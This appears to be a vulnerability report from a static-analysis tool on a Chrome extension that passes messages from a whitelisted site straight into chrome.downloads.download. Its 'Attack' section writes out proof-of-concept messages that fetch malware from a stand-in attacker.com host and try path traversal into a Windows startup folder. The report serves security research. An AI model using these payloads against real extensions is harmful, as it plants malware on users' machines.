# CoCo Analysis: gbceabffpdimeplfhancemhcphlfjhie

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_downloads_download_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gbceabffpdimeplfhancemhcphlfjhie/opgen_generated_files/bg.js
Line 967 (minified code showing flow from chrome.runtime.onMessageExternal to chrome.downloads.download)
```

**Code:**

```javascript
// Background script (bg.js) - Formatted from minified code
chrome.runtime.onMessageExternal.addListener((function(t, o, r) {
    return async function() {
        const {action: i, data: u} = t;  // ← attacker-controlled message

        if (["https://save.courses"].includes(o.origin)) {
            switch(i) {
                case "GET_DATA":
                    // ... handles GET_DATA
                    break;

                case "DOWNLOAD_RESOURCES":
                    // ... handles DOWNLOAD_RESOURCES
                    break;

                case "DOWNLOAD_VIDEO":
                    // Vulnerable code path
                    u && u.url && u.filename && (
                        chrome.downloads.download({
                            url: u.url,  // ← attacker-controlled URL
                            conflictAction: "overwrite",
                            filename: u.filename  // ← attacker-controlled filename
                        }),
                        r(!0)
                    );
            }
            c(t, r);
        }
    }(), !0
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted external website (https://save.courses)

**Attack:**

```javascript
// From https://save.courses/* domain, attacker can trigger arbitrary downloads
chrome.runtime.sendMessage(
    'gbceabffpdimeplfhancemhcphlfjhie',  // Extension ID
    {
        action: 'DOWNLOAD_VIDEO',
        data: {
            url: 'https://attacker.com/malware.exe',  // Arbitrary download URL
            filename: 'important_document.exe'  // Disguised filename
        }
    }
);

// Can also download to arbitrary paths (directory traversal)
chrome.runtime.sendMessage(
    'gbceabffpdimeplfhancemhcphlfjhie',
    {
        action: 'DOWNLOAD_VIDEO',
        data: {
            url: 'https://attacker.com/malicious.js',
            filename: '../../AppData/Roaming/startup.js'  // Attempt path traversal
        }
    }
);
```

**Impact:** Arbitrary file download vulnerability. An attacker controlling the whitelisted domain https://save.courses (or compromising it) can trigger the extension to download arbitrary files from attacker-controlled URLs with attacker-controlled filenames. This can be exploited to download malware, phishing content, or potentially exploit local file system through crafted filenames. The extension has the "downloads" permission in manifest.json, making this attack fully functional.
